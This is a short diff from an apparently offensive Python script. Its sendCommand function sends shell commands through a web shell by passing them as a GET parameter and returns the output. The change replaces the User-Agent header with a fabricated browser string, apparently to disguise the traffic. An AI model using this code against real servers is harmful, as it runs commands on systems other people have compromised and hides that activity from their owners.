@@ -26,7 +26,7 @@ if len(sys.argv) == 1 or len(sys.argv) < 5:
     sys.exit()
 
 def sendCommand(command, webshell):
-    headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"}
+    headers = {"User-Agent":"Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0"}
     params = {sys.argv[3]:command.strip()}
     response = requests.get((webshell), params=params, headers=headers)
     return response.content.decode(errors='ignore')
